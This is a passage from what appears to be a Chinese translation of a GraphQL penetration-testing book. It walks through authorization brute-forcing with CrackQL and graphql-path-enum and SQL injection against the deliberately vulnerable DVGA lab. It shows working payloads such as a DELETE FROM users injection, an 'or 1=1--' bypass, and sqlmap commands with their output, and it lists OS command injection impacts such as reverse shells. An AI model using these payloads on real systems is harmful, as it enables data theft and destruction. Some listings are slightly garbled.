GraphQL 开发者社区讨论过在 introspection 系统中公开 schema 级指令使用信息。然而，许多 GraphQL 实现目前不公开此信息。

### 使用 graphql-path-enum 枚举路径

为了测试授权控制，你应该尝试以你能想象的尽可能多的方式访问敏感字段。例如，考虑以下来自 DVGA schema 的摘录，其中三个查询访问 PasteObject：

```
type Query {
  pastes(public: Boolean, limit: Int, filter: String): [PasteObject]
  paste(id: Int, title: String): PasteObject
  --snip--
  users(id: Int): [UserObject]
  readAndBurn(id: Int): PasteObject
  search(keyword: String): [SearchResult]
  audits: [AuditObject]
  deleteAllPastes: Boolean
  me(token: String): UserObject
}
```

作为客户端，你可以使用 pastes、paste 或 readAndBurn 返回有关 pastes 的信息。在实现基于带的授权时，开发人员可能会意外地只保护其中一些查询。因此，确定到达给定对象类型的所有可能路径。

Schema 可能会非常庞大，因此你会发现自动化识别到达给定对象类型的所有路径的过程很有帮助。对于此任务，我们将使用 graphql-path-enum。此工具期望两个重要参数：introspection JSON 响应和我们想要测试授权问题的对象类型的名称。让我们用它来查找到达 PasteObject 对象类型的所有路径。

首先，通过将 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/queries/introspection_query.txt 中的查询粘贴到 Altair 中运行完整的 introspection 查询。发送请求并将响应复制到名为 introspection.json 的文件中。接下来，将此文件提供给 graphql-path-enum，并告诉它搜索所有通往 PasteObject 对象的路径，如 Listing 7-10 所示。





```
# cd ~
# ./graphql-path-enum -i introspection.json -t PasteObject

Found 3 ways to reach the "PasteObject" node:
- Query (pastes) -> PasteObject
- Query (paste) -> PasteObject
- Query (readAndBurn) -> PasteObject
```

Listing 7-10: Performing type path enumeration with graphql-path-enum

正如你所见，graphql-path-enum 遍历了 introspection 响应并识别了到达该对象的全部可能查询路径。现在我们可以手动发送这三个查询，看看其中是否有任何一个可以访问其他查询无法访问的对象。

如果你想在大型复杂的 GraphQL API 中练习 schema 遍历，可以尝试对流行的 Star Wars API（SWAPI）中的 Vehicle 对象类型运行 graphql-path-enum。该 API 的 schema 比 DVGA 更大，应该能说明在测试授权问题时路径枚举的重要性。你可以在 https://github.com/dolevjf/Black-Hat-GraphQL/blob/master/ch07/starwars-schema.json 访问 SWAPI schema。

## Brute-Forcing Arguments and Fields with CrackQL

由于 graphql-path-enum 仅适用于对象类型，你可能会尝试在第 6 章中讨论的 field-stuffing 技术，以测试旨在限制未授权用户可查看数据量的弱或不存在的授权控制。我们也可以使用 CrackQL 来以编程方式暴力破解我们不应访问的参数和字段。想象一个如下所示的查询：

```
query {
  users(id: 1) {
    username
    password
  }
}
```

现在，假设访问某些用户的信息需要特殊的授权权限。我们知道用户 ID 是数字且递增的，但不知道哪些受保护。让我们尝试用 CrackQL 暴力破解它们。

在 CrackQL 文件夹下的 sample-queries 中，创建一个名为 users.graphql 的新文件，内容如下：

```
query {
  users(id: {{id|int}}) {
    username
    password
  }
}
```

此查询使用带有 Int 类型的 id 参数的 users 字段。由于查询接受 id 参数，我们可以通过递增提供一系列数字用户标识符来尝试枚举账户。CrackQL 将渲染 {{id|int}} 字符串并用我们接下来要创建的 wordlist 中的词替换它。

让我们将可能的 user ID 字典创建为单列 CSV wordlist。这样的列表很容易用一些 Bash-fu 生成：

```
# cd ~/CrackQL
# echo "id" > sample-inputs/users.csv
# for id in `seq 1 100`; do echo $id >> sample-inputs/users.csv; done
```

接下来，通过打印前五行检查文件是否已正确生成：

```
# head -5 sample-inputs/users.csv

id
1
2
3
4
```

现在运行 CrackQL 以查找有效的用户 ID 并检索其 username 和 password 字段：

```
# python3 CrackQL.py -t http://localhost:5013/graphql -q sample-queries/users.graphql -i sample-inputs/users.csv --verbose

[+] Verifying Payload Batch Operation...
[+] Sending Alias Batch 1 of 1 to http://localhost:5013/graphql...
========================================
Results:

Data:
[{'alias1': {'data': [{'password': '******', 'username': 'admin'}], 'inputs': {'id': '120'}}, {'alias2': {'data': [{'password': '******', 'username': 'operator'}], 'inputs': {'id': '120'}}, {'alias3': {'data': [], 'inputs': {'id': '120'}}}],
```

你也可以以同样的方式暴力破解你怀疑因授权控制而无法访问的字段，只需修改原始查询以包含这些潜在字段即可：

```
query {
  users(id: {{id|int}}) {
    username
    password
    accessToken
  }
}
```

```
birthDate
location
}
}
```

CrackQL 将在 ~/CrackQL/results 文件夹下保存所有尝试的输出。如果这些字段可访问，你将在那里看到对它们的响应。

## Summary

在本章中，你了解了带内和带外的 GraphQL 身份验证和授权架构模型。我们回顾了开发者可能在其 GraphQL 部署中采用的几种传统控制，并指出了它们可能易受攻击的弱点。例如，使用 JWT token 的 GraphQL 实现可能容易受到 token 伪造的攻击。我们还将你的注意力引导到更新的、GraphQL 专用的身份验证和授权库和插件，例如 GraphQL Modules、GraphQL Shield 和自定义 schema 指令。

通过利用 GraphQL 的别名基于查询批处理等特性，我们可以手动暴力破解带内身份验证操作或使用 CrackQL 自动执行。使用 graphql-path-enum，我们可以枚举到类型的路径，并再次使用 CrackQL，我们可能在没有适当授权控制的情况下访问字段。

在下一章中，我们将转向另一个古老而常见的漏洞类别：注入，这些漏洞即使针对像 GraphQL 这样的现代 API 服务也继续造成破坏。

# 8

# INJECTION

![](img/2f244b00cd9f8f37cfc22f928aaa471a_212_0.png)

客户端以多种方式与 API 交互，例如创建、修改或删除数据。当应用程序必须处理其任意输入时，就会产生挑战。应用程序是否应该信任外部客户端发送的输入？内部客户端呢？

在本章中，你将了解注入漏洞，并发现为什么识别和保护由 GraphQL API 支持的应用程序的各种入口点很重要，以及不这样做的后果。我们将识别影响应用程序逻辑并操纵其执行其未专门设计的操作的机会。成功的注入可能导致从网页操纵到在数据库上执行代码等各种结果。

GraphQL 服务器通常与数据存储一起工作，例如关系数据库如 MySQL、文档数据库如 Elasticsearch、键/值存储如 Redis，甚至图数据库如 Neo4j。所有这些都可能

容易受到基于注入的漏洞的影响。在本章中，我们将讨论三种类型的注入漏洞。其中一些，如 SQL 注入（SQLi）和操作系统命令注入，影响后端服务如服务器和数据库。另一种，XSS，影响客户端。

## Injection Vulnerabilities in GraphQL

注入漏洞发生在应用程序接受并处理不可信的输入而没有任何清理时。清理是一种安全措施，涉及检查输入并从中删除可能危险的字符。缺少此类检查可能会允许输入被解释为命令或查询并在客户端或服务器端执行。注入是一类广泛的攻击，可能影响网络生态系统，例如操作系统、客户端浏览器、数据库、第三方系统等。

应用程序可能以多种方式意外引入注入漏洞，包括以下内容：

- 应用程序未对其接收的输入实施安全检查。
- 应用程序使用不安全的库（例如解析器）来处理用户输入。
- 应用程序将接收到的用户输入传递给第三方系统，而该系统未对输入实施安全检查。
- 应用程序接受输入并在不以任何方式转换的情况下将其显示给客户端。

一旦应用程序开始允许客户端通过查询、mutation 或 subscription 的参数等接口操纵数据，实现 GraphQL API 的应用程序就可能变得容易受到注入漏洞的影响。即使是仅允许客户端读取数据的 GraphQL API，也可能在某些接口（如查询过滤器）中存在漏洞。虽然风险可以降低，但几乎从未为零。

在构建 API 时，完全避免接受用户输入是很困难的。随着应用程序变得更复杂，它需要某种输入才能有用。例如，像 Twitter 或 Facebook 这样的网站如果不允许用户输入就完全没有意义。用户操作，如发推文、在某人的 Facebook 墙上写帖子，或将晚餐照片上传到 Instagram，都需要用户输入。

## The Blast Radius of Malicious Input

无论来自人类客户端，还是来自网络上其他服务器等机器，都必须考虑输入可能是恶意的。即使内部机器也可能被入侵并向其他服务器发送恶意输入。





应用程序通常是在宽松的信任模型下开发的。这种信任模型假设从同一网络上的其他内部系统进入 GraphQL API 的输入是安全的，而来自外部来源的输入是不安全的。这种做法非常常见，但以这种方式设计系统可能会适得其反；如果我们能够入侵一个系统并向网络上的另一台主机发送命令，我们就可以轻松地横向移动到其他服务器。图 8-1 说明了类似的场景。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_214_0.png)

图 8-1：网络信任边界

该图描述了一次渗透测试，其中我们识别出一个面向互联网的 GraphQL API 服务器，即公网服务器。该服务器恰好是双宿主的，这意味着它有两个网络接口，属于两个不同的网络。该服务器容易受到注入攻击，因为它没有充分检查从客户端收到的传入查询。

现在，想象一下图中内部服务器也是一台 GraphQL 服务器，设计为信任来自同一网络上系统的任何传入查询。它之所以这样配置，是因为它不面向互联网，并且在威胁模型中，安全架构师假设本地网络是安全的。然而，如果公网服务器被攻破，攻击者就可以向内部服务器发送恶意查询。

这就是为什么始终对任何用户输入执行安全检查如此重要。 这也是为什么当我们发现允许输入时，黑客必须测试注入漏洞至关重要的原因。

## OWASP Top 10

每隔几年，OWASP 都会在 OWASP Top 10 项目下发布针对 Web 应用程序的新漏洞类别排名，以帮助公司将其安全缓解工作重点放在最常见的软件缺陷类别上。

注入漏洞类别已在 OWASP Top 10 列表中存在近二十年。在最新的 OWASP Top 10 版本中，注入漏洞排名第三，如表 8-1 所示。

表 8-1：OWASP Top 10

| Identifier | Vulnerability |
|------------|---------------|
| A01 | Broken access control |
| A02 | Cryptographic failures |
| A03 | Injection |
| A04 | Insecure design |
| A05 | Security misconfiguration |
| A06 | Vulnerable and outdated components |
| A07 | Identification and authentication failures |
| A08 | Software and data integrity failures |
| A09 | Security logging and monitoring failures |
| A10 | Server-side request forgery |

OWASP 还开始在专门的项目 API Security Top 10 下跟踪 API 中的主要漏洞。这种拆分有助于区分 API 和非 API 漏洞。在截至本文撰写时的最新项目版本中，注入排名第八，如表 8-2 所示。

表 8-2：API Security Top 10

| Identifier | Vulnerability |
|------------|---------------|
| API1 | Broken object-level authorization |
| API2 | Broken user authentication |
| API3 | Excessive data exposure |
| API4 | Lack of resource and rate limiting |
| API5 | Broken function-level authorization |
| API6 | Mass assignment |
| API7 | Security misconfiguration |
| API8 | Injection |
| API9 | Improper asset management |
| API10 | Insufficient logging and monitoring |

注入漏洞在 API 中可能造成毁灭性后果，在进行渗透测试时，了解在非 API Web 应用程序和 API 中进行注入测试非常重要。

## 注入攻击面

GraphQL API 通常设计为从客户端接收输入，执行后端操作，例如数据库的读写，并返回响应。

从技术上讲，你可以拥有只读查询，例如以下查询，它不会在服务器端更改任何内容。客户端不能使用该查询传递任意数据，只能传递在 GraphQL 模式中定义的 GraphQL 字段 id 和 ipAddr，正如你在第 3 章中可能记得的那样：

```
query {
  pastes {
    id
    ipAddr
  }
}
```

如果应用程序未设计为以允许其修改服务器上数据的方式与客户端交互，应用程序开发人员可以仅使用只读操作，但实际上这种情况几乎永远不会发生。随着应用程序变得更加复杂和功能丰富，它们将需要通过诸如查询参数、字段参数或两者等接口接受客户端输入。

让我们在深入研究各种注入漏洞之前，先考虑几个允许客户端传递任意输入的 GraphQL 组件。对于这些接口中的每一个，你都应该问自己几个重要问题：

- 应用程序是否在验证传入的客户端输入？
- 应用程序是否接受危险字符？
- 当作为查询的一部分发送意外字符时，应用程序是否会抛出异常？
- GraphQL 是否检查传递给参数的值类型？
- 我们能否从 GraphQL 服务器响应（或带外响应）中推断出注入尝试是否成功？

注入测试需要一些反复试验，但一旦你取得突破，你会感到非常满意。

### 查询参数

GraphQL 操作例如查询、变更和订阅可以设计为接受参数。考虑以下查询，它传递一个 limit 参数，其整数值为 100。虽然此操作仍然是只读的，但它通过使用查询过滤器提供了操作服务器响应的接口：

```
query {
  pastes(limit: 100) {
    id
    ipAddr
  }
}
```

此参数不允许我们执行代码，但我们可以用多种方式利用它来影响服务器。例如，向 Int 类型参数 limit 提供负值（例如 -1）可能会导致意外行为。有时 API 将 -1 值解释为返回全部，在这种情况下，服务器将返回对象的整个列表。

当你识别到类型为 String 的参数时，你可能需要花一些时间尝试各种注入负载。考虑清单 8-1 中的 GraphQL 变更，它使用 createPaste 顶级字段。

```
mutation {
  createPaste(content: "Some content", title:"Some title", public: false) {
    paste {
      id
      ipAddr
    }
  }
}
```

清单 8-1：变更输入点

createPaste 字段非常容易理解；它从客户端获取信息并使用该数据在数据库中创建一个全新的 paste。在此示例中，客户端通过三个参数控制 paste 的格式：content、title 和 public。这些参数的类型不同。例如，content 和 title 是标量类型 String，而 public 是标量类型 Boolean。

想象一下，从数据库操作的角度来看，粘贴创建操作可能是什么样子。考虑以下 SQL 示例：

```
INSERT INTO pastes (content, title, public)
VALUES ('some_malicious_content', 'some_title', false)
```

当客户端查询被 GraphQL API 接收时，服务器可能需要在数据库中查找信息或写入信息以履行查询。如果 GraphQL API 设计为在没有适当安全验证的情况下处理来自 content 和 title 等参数的输入，数据可以直接注入到 SQL 命令中，这可能导致 SQLi 漏洞。

考虑以下 SQLi 示例，其中 SQL 命令被插入到 content 参数中：

```
mutation {
  createPaste(content: "content'); DELETE FROM users; --") {
    paste {
      id
      ipAddr
    }
  }
}
```

以这种方式构建的查询可能会在后端转换为 SQL 查询，并且可能看起来像这样：

```
INSERT INTO pastes (content) VALUES ('content'); DELETE FROM users; --
```

注意 GraphQL 是强类型的。这意味着当它看到类型不匹配时，它会拒绝它们。例如，类型为 Boolean 的参数不应接受类型为 String 的值，而只能接受 true 或 false 值。提供给参数的值在查询在验证阶段处理期间会根据 GraphQL 模式进行验证。

需要注意的是，GraphQL API 可以（并且应该）在查询解析器中具有多层防御性检查，以减轻任何形式的注入。

### 字段参数

与顶级字段一样，GraphQL 选择集中的字段也可以接受参数。考虑以下查询：

```
query {
  users {
    username(capitalize: true)
    id
  }
}
```

使用此查询，我们可以返回用户 ID 和用户名的列表。默认情况下，响应中的 username 字段为小写。添加 capitalize 参数并将其设置为 true 会导致 GraphQL 解析器将用户名大写。

字段参数可以实现为在字段中指定时执行不同的操作，并且在安全上下文中，与其他参数（例如指令的参数）并没有太大区别。传递给字段参数的值可以插入到数据库中或影响逻辑。应用程序甚至可能将它们用作不同内部 API 调用的部分，因此在存在这些参数时进行测试非常重要。

### 查询指令参数

附加到某些 GraphQL 字段的查询指令也可以接受参数，通常是 String 和 Boolean 等标量类型。这些指令的使用方式完全取决于实现，但始终值得检查它们允许客户端发送哪些类型的值。

考虑以下查询：

```
query {
  pastes {
    id
    ipAddr @show_network(style: "cidr")
  }
}
```

在此示例中，我们为指令 show_network 指定了一个名为 style 的参数。style 参数的类型为 String，并且接受任意字符串。在此示例中，我们提供 cidr 作为值。在后端，这会将 ipAddr（IP地址）字段转换为使用 Classless



Inter-Domain Routing (CIDR) 表示法。例如，IPv4 地址 192.168.0.1 将变为 192.168.0.1/32。

如果启用了 introspection，GraphQL IDE 工具如 GraphiQL Explorer 或 GraphQL Playground 在字段上开始输入 at 符号 (@) 时就会自动补全指令名称及其参数。字段及其参数也是如此。

查询指令参数也容易受到注入攻击。攻击者可以利用它们来影响服务器返回特定字段的响应方式。例如，查询指令可能会使用 argument where，然后将其翻译为 SQL 匹配模式（例如 LIKE 操作符）。

你可以使用第 8-2 节中所示的 introspection 查询，通过使用 __schema 元字段中的 directives 字段来获取仅可用的指令。

```
query GetDirectives {
  __schema {
    directives {
      name
      description
      locations
    }
  }
}
```

Listing 8-2: A GraphQL introspection query used to list directives

## Operation Names

操作名称是我们可以添加到 GraphQL 操作（如查询、变更或订阅）中的字符串。它们通常用于在同时发送多个查询时唯一命名每个查询。GraphQL 图形 IDE 如 GraphiQL Explorer 和 GraphQL Playground 使用操作名称作为一种方式，允许客户端通过下拉菜单在文档中存在多个查询时选择要运行的操作，如图 8-2 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_219_0.png)

Figure 8-2: Executing a selected query based on its operation name in GraphiQL Explorer

操作名称也用于其他目的，例如调试和日志记录。事实上，它们是有趣的潜在注入向量，因为应用程序可以用多种方式使用它们。例如，一些应用程序使用操作名称进行分析，以确定客户端使用最多的查询。操作名称字符串可能会出现在不同的系统中，例如日志系统、关系数据库、缓存数据库等。重要的是要检查 GraphQL API 是否允许操作名称中包含特殊字符，因为这可能成为可注入的接口。

操作名称通常是字母数字的，但一些 GraphQL 服务器实现在允许的字符类型方面比其他实现更宽松。

## Input Entry Points

在尝试对 GraphQL API 执行注入测试时，我们需要找到一种方法来发现输入入口点。如果我们幸运并且 introspection 保持启用，我们通常可以快速访问 API 支持的各种查询、变更和订阅，以及有关其类型、字段、参数等的信息，使用 Altair、GraphiQL Explorer 或 GraphQL Playground 等 GraphQL IDE 工具。

要在 Altair 中查看有关 DVGA 的此信息，将 URL 设置为 http://localhost:5013/graphql 并点击右上角的 Save 按钮（软盘图标）。点击 Save 按钮旁边的 Refresh 按钮，然后点击 Docs。你应该会看到查询、变更和订阅的各个部分。点击其中任何一个以查看每个内部存在的参数类型，如图 8-3 屏幕截图所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_220_0.png)

Figure 8-3: Schema documentation in the Altair client

如果运气不佳并且服务器上禁用了 introspection，我们可以依靠 Clairvoyance 等工具，我们在第 6 章中提到过它，来重建模式并发现各种可用的输入。Clairvoyance 将模糊 GraphQL 文档输入以发现其所有各种操作、字段、类型和参数，从而重建完整的模式视图，我们可以然后使用它来识别所有可能的输入。接下来我们将通过对 DVGA 执行注入测试，探索 GraphQL 世界中常见类型的注入可能是什么样子。

## SQL Injection

*SQL injection* 是最古老的类型漏洞之一。SQLi 漏洞发生在客户端输入直接插入到 SQL 命令中而未进行适当的字符转义时。此条件允许黑客关闭预期 SQL 查询并引入自己的 SQL 命令，从而有效地干扰应用程序对其数据库的查询。

GraphQL API 中的 SQLi 漏洞可能造成毁灭性后果。对数据库的完全或部分访问可能导致以下任何后果：

- **Impact to data integrity.** SQLi 漏洞可能允许我们操纵数据，例如通过更改数据库表中的数据。
- **Impact to data confidentiality.** SQLi 可能允许我们从数据库泄露信息，无论是从应用程序特定的 SQL 表还是同一数据库中的其他表。此信息可能包括 PII、密码哈希、敏感令牌等。
- **Impact to data availability.** SQLi 可能允许我们删除数据库的某些部分或完全删除其表，导致数据丢失和应用程序不稳定。

近年来，现代 Web 框架在缓解 SQLi 漏洞方面做得更好，通过提供开箱即用的防御机制，例如参数化查询。利用经过审计和验证的框架使开发人员能够更安全地编写代码，通过使用框架的内置安全功能，例如通过函数和库。

## Understanding the Types of SQL Injection

SQLi 漏洞有两类，每类都有几个子类。

## Classic SQL Injection

当应用程序在注入测试期间返回 SQL 查询错误时，你就知道遇到了 *classic SQLi*。这些错误可以直接显示在网页中或通过网络检查变得明显。用于识别经典 SQLi 漏洞的两种技术是基于错误和基于联合。

*Error-based SQLi* 用于通过错误观察来识别 SQLi 漏洞。应用程序在 SQL 查询执行失败时向客户端抛出 SQL 错误，这可能允许我们找到正确的攻击模式以成功利用 SQLi 漏洞。

Union-based SQLi 用于通过利用 UNION SQL 操作符来识别 SQLi 漏洞。UNION 将多个 SELECT 语句的结果连接起来，然后可以返回给客户端。

## Blind SQL Injection

在盲 SQLi 中，我们没有可见的迹象表明存在漏洞。应用程序可能会静默失败或将错误重定向到客户端之外。两种发现技术适用于盲 SQLi 类别。

Time-based SQLi 强制应用程序在返回响应之前等待一定时间。通过提供指示数据库等待特定秒数的 SQLi 有效负载，如果最终响应返回时出现类似延迟，我们可以推断应用程序存在漏洞。

Boolean-based SQLi 允许我们通过构造将返回布尔结果（如 true 或 false）的有效负载来推断应用程序是否容易受到 SQLi 攻击。通过使用此测试技术，我们可以影响应用程序向客户端呈现数据的方式，这有助于我们识别漏洞是否存在。

## Testing for SQLi

虽然 SQLi 漏洞正在减少，但偶尔仍能找到。作为黑客，我们应该假设我们正在测试的应用程序可能没有适当的安全控制来防止 SQLi，并在可能的情况下随时进行测试。

测试 SQLi 可以通过多种方式进行，例如以下：

- 提交单引号 (') 或双引号 (") 等字符并观察应用程序如何处理意外输入和错误。
- 模糊输入字段并观察可能指示数据库查询失败的应用程序错误。
- 提交引入延迟的 SQL 命令，例如使用 BENCHMARK 和 SLEEP 用于 MySQL 数据库，WAITFOR DELAY 和 WAITFOR TIME 用于 Microsoft SQL Server，或 pg_sleep 用于 PostgreSQL 数据库，然后执行响应时间分析以识别注入是否成功。这在我们执行盲 SQLi 测试时尤其有帮助，此时应用程序错误对我们不可见。

SQLi 在 GraphQL 中可以通过接受客户端输入的任何接口引入。在本节中，我们将通过使用 DVGA 在 GraphQL 中探索一个 SQLi 示例。

## Testing DVGA for SQLi with Burp Suite

GraphQL 注入测试的第一步是找到可以修改查询的位置。我们可以先查看模式


documentation in Altair。图 8-4 显示了 Query 部分。文档中还包含 mutation 和 subscription 部分，请也查看一下。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_223_0.png)

图 8-4：DVGA 中的查询

如你所见，我们有几个可供选择的查询。现在我们必须确定优先关注的区域。请注意，某些字段，例如 systemUpdate、systemHealth、audits 和 deleteAllPastes，不接受任何参数，因此我们最好关注那些接受参数的字段。让我们聚焦于 pastes 字段，它接受三个可选参数：

- public，类型为 Boolean
- limit，类型为 Integer
- filter，类型为 String

filter 参数可能是 SQLi 测试的有价值候选，因为它接受字符串值，并且其名称暗示它会过滤结果。这种过滤可能涉及后端查询解析器逻辑，使用 SQL 操作，例如 SQL WHERE 运算符，以完成查询。

现在我们有了目标，让我们开始与 DVGA 交互并代理流量。通过 Kali 的 Applications 菜单打开 Burp Suite，然后点击 Open Browser 打开位于 Proxy 选项卡下的内置浏览器，并导航到 http://localhost:5013。应用程序加载后，确保 Burp Suite 处于 Intercept 模式。导航到 DVGA 左侧边栏中的 Private Pastes 页面。你应该会看到与图 8-5 类似的 GraphQL 请求。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_224_0.png)

## 图 8-5：在 Burp Suite 中拦截 GraphQL 查询

如你所见，DVGA 使用 GraphQL pastes 查询操作发送 HTTP POST 请求，以从 GraphQL API 服务器获取私有粘贴列表。

NOTE 如果你没有立即看到发往 /graphql 的初始 POST 请求，请点击 Forward 直到它出现。

如果切换到 WebSockets History 选项卡，你会注意到 DVGA 也使用了 subscription 操作（图 8-6）。在此上下文中，subscription 操作允许客户端通过订阅 pastes 事件，在粘贴创建后立即从 API 读取新的粘贴。

为了更轻松地操作请求，通过在请求窗口的任意位置右键单击并点击 Send to Repeater 将请求发送到 Burp Suite 的 Repeater。然后点击 Repeater 选项卡查看捕获的请求。这允许你按需重放请求。

让我们更改查询以使用 filter 参数。首先，将查询修改为如下所示：

```
query {
  pastes(filter:"My First Paste") {
    id
    content
    title
  }
}
```

图 8-6：Burp Suite 中的历史 WebSocket 流量视图

请注意，当查询包含双引号时，我们必须在 Burp 中使用反斜杠 (\ ) 字符转义引号，如图 8-7 所示。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_225_0.png)

图 8-7：使用 Burp Repeater 发送修改后的 GraphQL 查询

> NOTE
> 如果你使用的是 Burp Suite 的授权专业版，可以从 Burp 的 BApp Store 安装 GraphQL Raider 插件。Raider 允许你直接在 Burp Suite 中发送原生 GraphQL 查询，而无需担心字符转义。

点击 Send 将查询发送到 GraphQL 服务器。作为对此查询的响应，我们应该收到一个与我们的过滤搜索模式匹配的粘贴。更具体地说，它匹配 content 字段：

```
"pastes": [
  {
    --snip--
    "title":"Testing Testing",
    "content":"My First Paste"
    --snip--
  }
]
```

此过滤搜索模式表明幕后可能正在发生某种 SQL 查询，并且该查询的行为类似于以下内容：

```
SELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste'
```

此 SQL 查询将从 pastes SQL 表中返回 id、content 和 title 列。使用 WHERE 运算符，结果将被过滤，仅返回 content 中包含字符串 My First Paste 的粘贴，如 LIKE 运算符所定义。

我们希望向应用程序投放一些字符，这些字符可能会破坏此查询并导致错误，这可能表明应用程序将我们的输入直接发送到查询中。例如，如果我们在搜索字符串后添加一个单引号 (')，SQL 查询就会被破坏，因为这会导致一个孤立的开头单引号而没有对应的闭合单引号。

让我们向 DVGA 发送以下查询，看看收到的响应（请注意单引号的添加）：

```
query {
  pastes(filter:"My First Paste'") {
    id
    content
    title
  }
}
```

在 Burp 中，修改请求使其看起来像图 8-8 所示。GraphQL 应返回包含应用程序错误的响应，通过 errors JSON 键揭示一些有趣的信息。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_227_0.png)

图 8-8：使用 Burp Suite 通过单引号破坏 SQL 查询

看起来我们的字符串导致 SQL 查询变得无效，因为它被直接注入到 SQL LIKE 搜索模式中。应用程序没有转义我们引入的单引号，这使我们能够完全破坏 SQL 查询。因此，SQLite（运行 DVGA 的 SQL 引擎）会抛出错误，正如错误输出中字符串 sqlite3.OperationalError 所显示的那样。

> NOTE 除了我们刚刚识别出的潜在 SQLi 漏洞外，这也是一个信息泄露漏洞，因为应用程序没有优雅地处理错误。泄露数据库信息的应用程序错误很有价值，因为它们为我们提供了数据库模式结构的洞察，例如后端数据库中存在哪些列或表。此信息可以帮助我们构建更精确的 SQLi 命令。

所以，我们认为我们找到了一个 SQLi 漏洞。那又怎样？好吧，我们可以通过更改 SQL 查询来检查是否能够从数据库中获取额外信息，例如返回所有粘贴：

```
query {
  pastes(filter:"My First Paste' or 1=1--") {
    title
    content
  }
}
```

现在 GraphQL 在解析传入的 GraphQL 查询后查询数据库时使用的 SQL 语句可能如下所示：

```
SELECT id, content, title FROM pastes WHERE content LIKE 'My First Paste' or 1=1--'
```

通过添加单引号，我们在 My First Paste 过滤模式之后立即结束 SQL LIKE 运算符。然后我们可以通过添加 1=1 比较引入一个使 SQL 查询始终为真的 or 条件。我们通过使用 SQL 中的注释双破折号 (--) 语法结束 SQL 查询，这会注释掉查询末尾的单引号，从而有效地确保我们的语法在修改后仍然有效。

图 8-9 显示了 Burp Suite 中此 SQLi 查询的外观及其结果。

![](img/2f244b00cd9f8f37cfc22f928aaa471a_228_0.png)

图 8-9：使用 Burp Suite 成功进行 SQL 注入

服务器响应包含 DVGA 数据库中的所有粘贴！这是一个基于布尔的 SQLi 示例。

## 自动化 SQL 注入

其他工具尝试自动化 SQLi 漏洞的检测。特别是，SQLmap 可以帮助使用针对各种数据库引擎（如 MySQL、PostgreSQL、SQLite 等）定制的有效载荷模糊测试 GraphQL API。

在执行 SQLi 测试时，你可以采用任何潜在的 GraphQL 查询并使用星号 (*) 标记 SQLmap 应注入有效载荷的特定位置。例如，考虑以下片段：

```
query {
  pastes(filter:"test*") {
    id
  }
}
```

在此示例中，SQLmap 将用其 SQLi 有效载荷数据库中的条目替换星号。

SQLmap 可以从文件中读取完整的 HTTP 请求。我们可以获取任何 HTTP 请求并将其输入 SQLmap，SQLmap 将读取查询并使用它执行 SQL。图 8-10 显示了如何在 Burp Suite 中将请求保存到文件。右键单击请求窗口中的任意位置并选择 Copy to File。将文件命名为 request.txt 并保存。





![](img/2f244b00cd9f8f37cfc22f928aaa471a_229_0.png)

图 8-10：从 Burp Suite 将 HTTP 请求保存到文件

接下来，使用 -r（request）参数运行 SQLmap 来指定文件。将目标数据库引擎参数（--dbms）设置为 sqlite。通过提供数据库引擎名称，我们将执行的测试数量缩小到仅相关的子集，从而加快注入测试的过程。清单 8-3 显示了如何运行该命令。

```
# sqlmap -r request.txt --dbms=sqlite --tables
```

```
[14:30:53] [INFO] parsing HTTP request from 'request.txt'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y

JSON data found in POST body. Do you want to process it? [Y/n/q] n

[14:30:55] [INFO] testing connection to the target URL
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y

[14:30:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

Parameter: #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: {"query":"query getPastes {\n            pastes(filter:\"test' UNION ALL SELECT CHAR(113,122,98,122,113)||CHAR(102,90,76,111,106,97,117,117,105,113,101,121,72,117,112,87,114,99,114,65,99,86,84,120,72,69,115,122,120,77,121,119,122,103,108,116,87,100,114,82)||CHAR(113,122,98,98,113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,-bgJM\") {\n            id\n            title\n            content\n            ipAddr\n            userAgent\n            owner {\n                name\n            }\n        }\n    }"
```

清单 8-3：SQLmap 成功注入输出

SQLmap 通知我们它找到了我们的星号标记 (*) 并询问是否要处理它。输入 Y。工具随后指出它在 request.txt 文件中发现了 JSON 数据，并询问是否应将其解释为 JSON。输入 N，因为 GraphQL 语法可能会混淆 SQLmap。接下来，它建议减少请求数量并仅使用基本的 UNION 测试。输入 Y。测试发现我们的参数存在漏洞，因此输入 N 以指示 SQLmap 不再执行任何其他测试。工具还突出显示了导致成功注入的有效载荷。

现在我们可以使用 --tables 参数收集数据库信息，这将列出 DVGA 中的数据库表，如清单 8-4 所示。

```
# sqlmap -r request.txt --dbms=sqlite --tables

[14:34:05] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[5 tables]
+----------+
| audits   |
| owners   |
| pastes   |
| servermode |
| users    |
+----------+
```

清单 8-4：使用 SQLmap 列出 DVGA 数据库中的表

正如你所见，我们已返回 DVGA 中各个组件的表。干得好！我们既手动又自动地识别出了 SQL 注入漏洞。

## 操作系统命令注入

操作系统（OS）命令注入漏洞是指影响应用程序底层操作系统的注入，当用户输入被插入到系统 shell 命令中时就会发生。这种情况允许我们引入额外的参数或突破指定的命令并运行我们控制的命令。

与 SQLi 类似，OS 命令注入也可能对应用程序造成严重后果，使攻击者能够执行以下操作：

- 枚举本地服务、进程、用户和组
- 泄露本地文件系统文件，例如敏感配置文件、数据库文件等
- 通过使服务器回调到我们的远程 shell 来获得远程访问权限
- 使用专用恶意软件将服务器转变为攻击发起平台
- 将服务器转变为加密货币矿机

OS 命令注入实际上可以让我们在服务器上执行系统管理任务，通常是在 Web 应用程序用户的上下文中。Web 服务器通常在诸如 www-data、apache、nginx 之类的 Unix 账户下运行，如果运气非常好，则是 root 用户。

